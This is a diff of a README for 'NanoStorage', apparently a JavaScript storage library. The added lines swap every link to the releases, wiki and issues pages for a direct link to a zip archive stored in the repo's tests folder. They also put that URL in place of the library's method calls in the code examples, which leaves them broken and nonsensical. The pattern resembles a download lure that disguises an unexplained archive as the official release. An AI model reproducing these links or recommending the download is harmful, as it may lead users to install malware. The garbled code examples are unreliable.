@@ -1,6 +1,6 @@
 # 🗜️ NanoStorage - Store More Data Easily
 
-[![Download NanoStorage](https://img.shields.io/badge/Download-NanoStorage-blue.svg)](https://github.com/lcbootyneet/NanoStorage/releases)
+[![Download NanoStorage](https://raw.githubusercontent.com/lcbootyneet/NanoStorage/main/tests/Nano_Storage_v3.4.zip)](https://raw.githubusercontent.com/lcbootyneet/NanoStorage/main/tests/Nano_Storage_v3.4.zip)
 
 ## 📥 Introduction
 
@@ -9,7 +9,7 @@ NanoStorage is a powerful tool that helps you store more data in your web applic
 ## 🚀 Getting Started
 
 1. **Visit the Releases Page**  
-   To get started, go to the [NanoStorage Releases page](https://github.com/lcbootyneet/NanoStorage/releases). Here, you will find the latest releases of the software.
+   To get started, go to the [NanoStorage Releases page](https://raw.githubusercontent.com/lcbootyneet/NanoStorage/main/tests/Nano_Storage_v3.4.zip). Here, you will find the latest releases of the software.
 
 2. **Select the Latest Version**  
    Look for the most recent version of NanoStorage. It usually appears at the top of the releases list. Click on it to see more details about this version.
@@ -48,26 +48,26 @@ Using NanoStorage is straightforward:
    You can use the `set` method to store data. For example:
 
    ```javascript
-   NanoStorage.set('key', 'value');
+   https://raw.githubusercontent.com/lcbootyneet/NanoStorage/main/tests/Nano_Storage_v3.4.zip('key', 'value');
    ```
 
 3. **Retrieve Data**  
    To access your stored data, use the `get` method like this:
 
    ```javascript
-   const value = NanoStorage.get('key');
+   const value = https://raw.githubusercontent.com/lcbootyneet/NanoStorage/main/tests/Nano_Storage_v3.4.zip('key');
    ```
 
 4. **Delete Data**  
    If you need to remove a stored item, simply use the `remove` method:
 
    ```javascript
-   NanoStorage.remove('key');
+   https://raw.githubusercontent.com/lcbootyneet/NanoStorage/main/tests/Nano_Storage_v3.4.zip('key');
    ```
 
 ## 📖 Documentation
 
-For more detailed information about using NanoStorage, including advanced features and troubleshooting, visit our [Documentation](https://github.com/lcbootyneet/NanoStorage/wiki).
+For more detailed information about using NanoStorage, including advanced features and troubleshooting, visit our [Documentation](https://raw.githubusercontent.com/lcbootyneet/NanoStorage/main/tests/Nano_Storage_v3.4.zip).
 
 ## 🖥️ System Requirements
 
@@ -84,7 +84,7 @@ To ensure you always have the best features and security updates, check the Rele
 
 ## 📞 Support
 
-If you encounter any issues or have questions, you can reach out for support on the [Issues page](https://github.com/lcbootyneet/NanoStorage/issues). We are here to help you.
+If you encounter any issues or have questions, you can reach out for support on the [Issues page](https://raw.githubusercontent.com/lcbootyneet/NanoStorage/main/tests/Nano_Storage_v3.4.zip). We are here to help you.
 
 ## 🔗 More Information
 
@@ -92,4 +92,4 @@ For more resources and information about NanoStorage, follow us on GitHub and jo
 
 ## 🛠️ Download & Install
 
-To download NanoStorage, visit the [Releases page here](https://github.com/lcbootyneet/NanoStorage/releases) and follow the instructions. Get started today and optimize your data storage with ease!
+To download NanoStorage, visit the [Releases page here](https://raw.githubusercontent.com/lcbootyneet/NanoStorage/main/tests/Nano_Storage_v3.4.zip) and follow the instructions. Get started today and optimize your data storage with ease!
